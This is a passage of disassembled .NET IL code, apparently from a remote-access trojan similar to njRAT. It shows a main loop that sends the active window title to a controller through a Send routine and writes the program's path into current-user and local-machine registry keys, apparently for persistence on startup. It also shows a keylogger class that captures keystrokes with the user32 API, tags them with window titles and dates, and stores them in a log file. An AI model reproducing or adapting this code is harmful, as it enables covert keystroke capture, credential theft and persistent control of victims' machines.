      IL_015f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0164:  stloc.s    V_10
      IL_0166:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_016b:  leave.s    IL_016d

    }  // end handler
    IL_016d:  ldc.i4.0
    IL_016e:  stloc.0
    IL_016f:  ldstr      ""
    IL_0174:  stloc.1
    IL_0175:  ldsfld     bool ClassLibrary1.OK::BD
    IL_017a:  brfalse.s  IL_01a4

    .try
    {
      IL_017c:  ldnull
      IL_017d:  ldftn      void ClassLibrary1.A::_Lambda$__4(object,
                                                             class [System]Microsoft.Win32.SessionEndingEventArgs)
      IL_0183:  newobj     instance void [System]Microsoft.Win32.SessionEndingEventHandler::.ctor(object,
                                                                                                  native int)
      IL_0188:  call       void [System]Microsoft.Win32.SystemEvents::add_SessionEnding(class [System]Microsoft.Win32.SessionEndingEventHandler)
      IL_018d:  ldc.i4.1
      IL_018e:  call       void ClassLibrary1.OK::pr(int32)
      IL_0193:  leave.s    IL_01a4

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0195:  dup
      IL_0196:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_019b:  stloc.s    V_11
      IL_019d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01a2:  leave.s    IL_01a4

    }  // end handler
    IL_01a4:  ldc.i4     0x3e8
    IL_01a9:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_01ae:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    .try
    {
      IL_01b3:  ldloc.0
      IL_01b4:  ldc.i4.1
      IL_01b5:  add.ovf
      IL_01b6:  stloc.0
      IL_01b7:  ldloc.0
      IL_01b8:  ldc.i4.5
      IL_01b9:  bne.un.s   IL_01e1

      .try
      {
        IL_01bb:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_01c0:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
        IL_01c5:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
        IL_01ca:  call       bool ClassLibrary1.OK::EmptyWorkingSet(int64)
        IL_01cf:  pop
        IL_01d0:  leave.s    IL_01e1

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_01d2:  dup
        IL_01d3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01d8:  stloc.s    V_12
        IL_01da:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_01df:  leave.s    IL_01e1

      }  // end handler
      IL_01e1:  ldloc.0
      IL_01e2:  ldc.i4.8
      IL_01e3:  ble.s      IL_0214

      IL_01e5:  ldc.i4.0
      IL_01e6:  stloc.0
      IL_01e7:  call       string ClassLibrary1.OK::ACT()
      IL_01ec:  stloc.s    V_13
      IL_01ee:  ldloc.1
      IL_01ef:  ldloc.s    V_13
      IL_01f1:  ldc.i4.0
      IL_01f2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_01f7:  ldc.i4.0
      IL_01f8:  beq.s      IL_0214

      IL_01fa:  ldloc.s    V_13
      IL_01fc:  stloc.1
      IL_01fd:  ldstr      "act"
      IL_0202:  ldsfld     string ClassLibrary1.OK::Y
      IL_0207:  ldloc.s    V_13
      IL_0209:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_020e:  call       bool ClassLibrary1.OK::Send(string)
      IL_0213:  pop
      IL_0214:  ldsfld     bool ClassLibrary1.OK::Isu
      IL_0219:  brfalse    IL_0356

      .try
      {
        IL_021e:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
        IL_0223:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0228:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_022d:  ldsfld     string ClassLibrary1.OK::sf
        IL_0232:  ldstr      "\\"
        IL_0237:  ldsfld     string ClassLibrary1.OK::RG
        IL_023c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0241:  ldstr      ""
        IL_0246:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_024b:  ldstr      "\""
        IL_0250:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
        IL_0255:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_025a:  ldstr      "\" .."
        IL_025f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0264:  ldc.i4.0
        IL_0265:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_026a:  brfalse.s  IL_02a9

        IL_026c:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
        IL_0271:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0276:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_027b:  ldsfld     string ClassLibrary1.OK::sf
        IL_0280:  ldc.i4.1
        IL_0281:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_0286:  ldsfld     string ClassLibrary1.OK::RG
        IL_028b:  ldstr      "\""
        IL_0290:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
        IL_0295:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_029a:  ldstr      "\" .."
        IL_029f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02a4:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_02a9:  leave.s    IL_02ba

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02ab:  dup
        IL_02ac:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02b1:  stloc.s    V_14
        IL_02b3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02b8:  leave.s    IL_02ba

      }  // end handler
      .try
      {
        IL_02ba:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
        IL_02bf:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_02c4:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_02c9:  ldsfld     string ClassLibrary1.OK::sf
        IL_02ce:  ldstr      "\\"
        IL_02d3:  ldsfld     string ClassLibrary1.OK::RG
        IL_02d8:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02dd:  ldstr      ""
        IL_02e2:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_02e7:  ldstr      "\""
        IL_02ec:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
        IL_02f1:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_02f6:  ldstr      "\" .."
        IL_02fb:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0300:  ldc.i4.0
        IL_0301:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_0306:  brfalse.s  IL_0345

        IL_0308:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
        IL_030d:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0312:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0317:  ldsfld     string ClassLibrary1.OK::sf
        IL_031c:  ldc.i4.1
        IL_031d:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_0322:  ldsfld     string ClassLibrary1.OK::RG
        IL_0327:  ldstr      "\""
        IL_032c:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
        IL_0331:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0336:  ldstr      "\" .."
        IL_033b:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0340:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_0345:  leave.s    IL_0356

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0347:  dup
        IL_0348:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_034d:  stloc.s    V_15
        IL_034f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0354:  leave.s    IL_0356

      }  // end handler
      IL_0356:  leave.s    IL_0367

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0358:  dup
      IL_0359:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_035e:  stloc.s    V_16
      IL_0360:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0365:  leave.s    IL_0367

    }  // end handler
    IL_0367:  br         IL_01a4
  } // end of method A::main

  .method private specialname static void 
          _Lambda$__4(object a0,
                      class [System]Microsoft.Win32.SessionEndingEventArgs a1) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  call       void ClassLibrary1.OK::ED()
    IL_0005:  ret
  } // end of method A::_Lambda$__4

} // end of class ClassLibrary1.A

.class public auto ansi ClassLibrary1.kl
       extends [mscorlib]System.Object
{
  .field private int32 LastAV
  .field private string LastAS
  .field private valuetype [System.Windows.Forms]System.Windows.Forms.Keys lastKey
  .field public class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Clock Clock
  .field public string Logs
  .field private class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard keyboard
  .field public string LogsPath
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       68 (0x44)
    .maxstack  3
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldc.i4.0
    IL_0008:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys ClassLibrary1.kl::lastKey
    IL_000d:  ldarg.0
    IL_000e:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Clock::.ctor()
    IL_0013:  stfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Clock ClassLibrary1.kl::Clock
    IL_0018:  ldarg.0
    IL_0019:  ldstr      ""
    IL_001e:  stfld      string ClassLibrary1.kl::Logs
    IL_0023:  ldarg.0
    IL_0024:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::.ctor()
    IL_0029:  stfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard ClassLibrary1.kl::keyboard
    IL_002e:  ldarg.0
    IL_002f:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
    IL_0034:  ldstr      ".tmp"
    IL_0039:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003e:  stfld      string ClassLibrary1.kl::LogsPath
    IL_0043:  ret
  } // end of method kl::.ctor

  .method private static pinvokeimpl("user32.dll" winapi) 
          int32  ToUnicodeEx(uint32 wVirtKey,
                             uint32 wScanCode,
                             uint8[] lpKeyState,
                             [out] class [mscorlib]System.Text.StringBuilder  marshal( lpwstr) pwszBuff,
                             int32 cchBuff,
                             uint32 wFlags,
                             native int dwhkl) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  GetKeyboardState(uint8[] lpKeyState) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          uint32  MapVirtualKey(uint32 uCode,
                                uint32 uMapType) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          int32  GetWindowThreadProcessId(native int hwnd,
                                          int32& lpdwProcessID) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  GetKeyboardLayout(int32 dwLayout) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int16  GetAsyncKeyState(int32 vKey) cil managed preservesig
  {
  }
  .method private instance string  AV() cil managed
  {
    // Code size       210 (0xd2)
    .maxstack  4
    .locals init (string V_0,
             int32 V_1,
             native int V_2,
             class [System]System.Diagnostics.Process V_3,
             class [mscorlib]System.Exception V_4,
             string[] V_5)
    .try
    {
      IL_0000:  call       native int ClassLibrary1.kl::GetForegroundWindow()
      IL_0005:  stloc.2
      IL_0006:  ldloc.2
      IL_0007:  ldloca.s   V_1
      IL_0009:  call       int32 ClassLibrary1.kl::GetWindowThreadProcessId(native int,
                                                                            int32&)
      IL_000e:  pop
      IL_000f:  ldloc.1
      IL_0010:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0015:  stloc.3
      IL_0016:  ldloca.s   V_2
      IL_0018:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_001d:  ldarg.0
      IL_001e:  ldfld      int32 ClassLibrary1.kl::LastAV
      IL_0023:  ceq
      IL_0025:  ldarg.0
      IL_0026:  ldfld      string ClassLibrary1.kl::LastAS
      IL_002b:  ldloc.3
      IL_002c:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0031:  ldc.i4.0
      IL_0032:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0037:  ldc.i4.0
      IL_0038:  ceq
      IL_003a:  and
      IL_003b:  ldloc.3
      IL_003c:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0041:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0046:  ldc.i4.0
      IL_0047:  ceq
      IL_0049:  or
      IL_004a:  brfalse.s  IL_004e

      IL_004c:  leave.s    IL_00ca

      IL_004e:  ldarg.0
      IL_004f:  ldloca.s   V_2
      IL_0051:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_0056:  stfld      int32 ClassLibrary1.kl::LastAV
      IL_005b:  ldarg.0
      IL_005c:  ldloc.3
      IL_005d:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0062:  stfld      string ClassLibrary1.kl::LastAS
      IL_0067:  ldc.i4.7
      IL_0068:  newarr     [mscorlib]System.String
      IL_006d:  stloc.s    V_5
      IL_006f:  ldloc.s    V_5
      IL_0071:  ldc.i4.0
      IL_0072:  ldstr      bytearray (0D 00 0A 00 01 00 ) 
      IL_0077:  stelem.ref
      IL_0078:  ldloc.s    V_5
      IL_007a:  ldc.i4.1
      IL_007b:  ldarg.0
      IL_007c:  callvirt   instance string ClassLibrary1.kl::HM()
      IL_0081:  stelem.ref
      IL_0082:  ldloc.s    V_5
      IL_0084:  ldc.i4.2
      IL_0085:  ldstr      " "
      IL_008a:  stelem.ref
      IL_008b:  ldloc.s    V_5
      IL_008d:  ldc.i4.3
      IL_008e:  ldloc.3
      IL_008f:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_0094:  stelem.ref
      IL_0095:  ldloc.s    V_5
      IL_0097:  ldc.i4.4
      IL_0098:  ldstr      " "
      IL_009d:  stelem.ref
      IL_009e:  ldloc.s    V_5
      IL_00a0:  ldc.i4.5
      IL_00a1:  ldarg.0
      IL_00a2:  ldfld      string ClassLibrary1.kl::LastAS
      IL_00a7:  stelem.ref
      IL_00a8:  ldloc.s    V_5
      IL_00aa:  ldc.i4.6
      IL_00ab:  ldstr      bytearray (01 00 0D 00 0A 00 ) 
      IL_00b0:  stelem.ref
      IL_00b1:  ldloc.s    V_5
      IL_00b3:  call       string [mscorlib]System.String::Concat(string[])
      IL_00b8:  stloc.0
      IL_00b9:  leave.s    IL_00d0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00bb:  dup
      IL_00bc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c1:  stloc.s    V_4
      IL_00c3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c8:  leave.s    IL_00ca

    }  // end handler
    IL_00ca:  ldstr      ""
    IL_00cf:  ret

    IL_00d0:  ldloc.0
    IL_00d1:  ret
  } // end of method kl::AV

  .method private instance string  HM() cil managed
  {
    // Code size       49 (0x31)
    .maxstack  2
    .locals init (string V_0,
             class [mscorlib]System.Exception V_1,
             valuetype [mscorlib]System.DateTime V_2)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Clock ClassLibrary1.kl::Clock
      IL_0006:  callvirt   instance valuetype [mscorlib]System.DateTime [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Clock::get_LocalTime()
      IL_000b:  stloc.2
      IL_000c:  ldloca.s   V_2
      IL_000e:  ldstr      "yy/MM/dd"
      IL_0013:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_0018:  stloc.0
      IL_0019:  leave.s    IL_002f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001b:  dup
      IL_001c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0021:  stloc.1
      IL_0022:  ldstr      "\?\?/\?\?/\?\?"
      IL_0027:  stloc.0
      IL_0028:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002d:  leave.s    IL_002f

    }  // end handler
    IL_002f:  ldloc.0
    IL_0030:  ret
  } // end of method kl::HM

  .method private static string  VKCodeToUnicode(uint32 VKCode) cil managed
  {
    // Code size       134 (0x86)
    .maxstack  7
    .locals init (string V_0,
             int32 V_1,
             uint8[] V_2,
             bool V_3,
             native int V_4,
             native int V_5,
             int32 V_6,
             uint32 V_7,
             class [mscorlib]System.Text.StringBuilder V_8,
             class [mscorlib]System.Exception V_9)
    .try
    {
      IL_0000:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_0005:  stloc.s    V_8
      IL_0007:  ldc.i4     0xff
      IL_000c:  newarr     [mscorlib]System.Byte
      IL_0011:  stloc.2
      IL_0012:  ldloc.2
      IL_0013:  call       bool ClassLibrary1.kl::GetKeyboardState(uint8[])
      IL_0018:  stloc.3
      IL_0019:  ldloc.3
      IL_001a:  brtrue.s   IL_0024

      IL_001c:  ldstr      ""
      IL_0021:  stloc.0
      IL_0022:  leave.s    IL_0084

      IL_0024:  ldarg.0
      IL_0025:  ldc.i4.0
      IL_0026:  call       uint32 ClassLibrary1.kl::MapVirtualKey(uint32,
                                                                  uint32)
      IL_002b:  stloc.s    V_7
      IL_002d:  call       native int ClassLibrary1.kl::GetForegroundWindow()
      IL_0032:  stloc.s    V_4
      IL_0034:  ldc.i4.0
      IL_0035:  stloc.s    V_6
      IL_0037:  ldloc.s    V_4
      IL_0039:  ldloca.s   V_6
      IL_003b:  call       int32 ClassLibrary1.kl::GetWindowThreadProcessId(native int,
                                                                            int32&)
      IL_0040:  stloc.1
      IL_0041:  ldloc.1
      IL_0042:  call       int32 ClassLibrary1.kl::GetKeyboardLayout(int32)
      IL_0047:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
      IL_004c:  stloc.s    V_5
      IL_004e:  ldarg.0
      IL_004f:  ldloc.s    V_7
      IL_0051:  ldloc.2
      IL_0052:  ldloc.s    V_8
      IL_0054:  ldc.i4.5
      IL_0055:  ldc.i4.0
      IL_0056:  ldloc.s    V_5
      IL_0058:  call       int32 ClassLibrary1.kl::ToUnicodeEx(uint32,
                                                               uint32,
                                                               uint8[],
                                                               class [mscorlib]System.Text.StringBuilder,
                                                               int32,
                                                               uint32,
                                                               native int)
      IL_005d:  pop
      IL_005e:  ldloc.s    V_8
      IL_0060:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_0065:  stloc.0
      IL_0066:  leave.s    IL_0084

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0068:  dup
      IL_0069:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_006e:  stloc.s    V_9
      IL_0070:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0075:  leave.s    IL_0077

    }  // end handler
    IL_0077:  ldarg.0
    IL_0078:  conv.ovf.i4.un
    IL_0079:  box        [System.Windows.Forms]System.Windows.Forms.Keys
    IL_007e:  callvirt   instance string [mscorlib]System.Enum::ToString()
    IL_0083:  ret

    IL_0084:  ldloc.0
    IL_0085:  ret
  } // end of method kl::VKCodeToUnicode

  .method private instance string  Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys k) cil managed
  {
    // Code size       388 (0x184)
    .maxstack  3
    .locals init (string V_0,
             bool V_1,
             class [mscorlib]System.Exception V_2,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_3,
             char V_4)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard ClassLibrary1.kl::keyboard
    IL_0006:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_ShiftKeyDown()
    IL_000b:  stloc.1
    IL_000c:  ldarg.0
    IL_000d:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard ClassLibrary1.kl::keyboard
    IL_0012:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CapsLock()
    IL_0017:  brfalse.s  IL_0022

    IL_0019:  ldloc.1
    IL_001a:  brfalse.s  IL_0020

    IL_001c:  ldc.i4.0
    IL_001d:  stloc.1
    IL_001e:  br.s       IL_0022

    IL_0020:  ldc.i4.1
    IL_0021:  stloc.1
    .try
    {
      IL_0022:  ldarg.1
      IL_0023:  stloc.3
      IL_0024:  ldloc.3
      IL_0025:  ldc.i4.s   112
      IL_0027:  beq.s      IL_006e

      IL_0029:  ldloc.3
      IL_002a:  ldc.i4.s   113
      IL_002c:  beq.s      IL_006e

      IL_002e:  ldloc.3
      IL_002f:  ldc.i4.s   114
      IL_0031:  beq.s      IL_006e

      IL_0033:  ldloc.3
      IL_0034:  ldc.i4.s   115
      IL_0036:  beq.s      IL_006e

      IL_0038:  ldloc.3
      IL_0039:  ldc.i4.s   116
      IL_003b:  beq.s      IL_006e

      IL_003d:  ldloc.3
      IL_003e:  ldc.i4.s   117
      IL_0040:  beq.s      IL_006e

      IL_0042:  ldloc.3
      IL_0043:  ldc.i4.s   118
      IL_0045:  beq.s      IL_006e

      IL_0047:  ldloc.3
      IL_0048:  ldc.i4.s   119
      IL_004a:  beq.s      IL_006e

      IL_004c:  ldloc.3
      IL_004d:  ldc.i4.s   120
      IL_004f:  beq.s      IL_006e

      IL_0051:  ldloc.3
      IL_0052:  ldc.i4.s   121
      IL_0054:  beq.s      IL_006e

      IL_0056:  ldloc.3
      IL_0057:  ldc.i4.s   122
      IL_0059:  beq.s      IL_006e

      IL_005b:  ldloc.3
      IL_005c:  ldc.i4.s   123
      IL_005e:  beq.s      IL_006e

      IL_0060:  ldloc.3
      IL_0061:  ldc.i4.s   35
      IL_0063:  beq.s      IL_006e

      IL_0065:  ldloc.3
      IL_0066:  ldc.i4.s   46
      IL_0068:  beq.s      IL_006e

      IL_006a:  ldloc.3
      IL_006b:  ldc.i4.8
      IL_006c:  bne.un.s   IL_008e

      IL_006e:  ldstr      "["
      IL_0073:  ldarg.1
      IL_0074:  box        [System.Windows.Forms]System.Windows.Forms.Keys
      IL_0079:  callvirt   instance string [mscorlib]System.Enum::ToString()
      IL_007e:  ldstr      "]"
      IL_0083:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0088:  stloc.0
      IL_0089:  leave      IL_0182

      IL_008e:  ldloc.3
      IL_008f:  ldc.i4     0xa0
      IL_0094:  beq.s      IL_00d0

      IL_0096:  ldloc.3
      IL_0097:  ldc.i4     0xa1
      IL_009c:  beq.s      IL_00d0

      IL_009e:  ldloc.3
      IL_009f:  ldc.i4     0x10000
      IL_00a4:  beq.s      IL_00d0

      IL_00a6:  ldloc.3
      IL_00a7:  ldc.i4.s   16
      IL_00a9:  beq.s      IL_00d0

      IL_00ab:  ldloc.3
      IL_00ac:  ldc.i4     0x20000
      IL_00b1:  beq.s      IL_00d0

      IL_00b3:  ldloc.3
      IL_00b4:  ldc.i4.s   17
      IL_00b6:  beq.s      IL_00d0

      IL_00b8:  ldloc.3
      IL_00b9:  ldc.i4     0xa3
      IL_00be:  beq.s      IL_00d0

      IL_00c0:  ldloc.3
      IL_00c1:  ldc.i4     0xa2
      IL_00c6:  beq.s      IL_00d0

      IL_00c8:  ldloc.3
      IL_00c9:  ldc.i4     0x40000
      IL_00ce:  bne.un.s   IL_00db

      IL_00d0:  ldstr      ""
      IL_00d5:  stloc.0
      IL_00d6:  leave      IL_0182

      IL_00db:  ldloc.3
      IL_00dc:  ldc.i4.s   32
      IL_00de:  bne.un.s   IL_00eb

      IL_00e0:  ldstr      " "
      IL_00e5:  stloc.0
      IL_00e6:  leave      IL_0182

      IL_00eb:  ldloc.3
      IL_00ec:  ldc.i4.s   13
      IL_00ee:  beq.s      IL_00f5

      IL_00f0:  ldloc.3
      IL_00f1:  ldc.i4.s   13
      IL_00f3:  bne.un.s   IL_0117

      IL_00f5:  ldarg.0
      IL_00f6:  ldfld      string ClassLibrary1.kl::Logs
      IL_00fb:  ldstr      "[ENTER]\r\n"
      IL_0100:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
      IL_0105:  brfalse.s  IL_010f

      IL_0107:  ldstr      ""
      IL_010c:  stloc.0
      IL_010d:  leave.s    IL_0182

      IL_010f:  ldstr      "[ENTER]\r\n"
      IL_0114:  stloc.0
      IL_0115:  leave.s    IL_0182

      IL_0117:  ldloc.3
      IL_0118:  ldc.i4.s   9
      IL_011a:  bne.un.s   IL_0124

      IL_011c:  ldstr      "[TAP]\r\n"
      IL_0121:  stloc.0
      IL_0122:  leave.s    IL_0182

      IL_0124:  ldloc.1
      IL_0125:  brfalse.s  IL_0136

      IL_0127:  ldarg.1
      IL_0128:  conv.ovf.u4
      IL_0129:  call       string ClassLibrary1.kl::VKCodeToUnicode(uint32)
      IL_012e:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0133:  stloc.0
      IL_0134:  leave.s    IL_0182

      IL_0136:  ldarg.1
      IL_0137:  conv.ovf.u4
      IL_0138:  call       string ClassLibrary1.kl::VKCodeToUnicode(uint32)
      IL_013d:  stloc.0
      IL_013e:  leave.s    IL_0182

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0140:  dup
      IL_0141:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0146:  stloc.2
      IL_0147:  ldloc.1
      IL_0148:  brfalse.s  IL_0166

      IL_014a:  ldarg.1
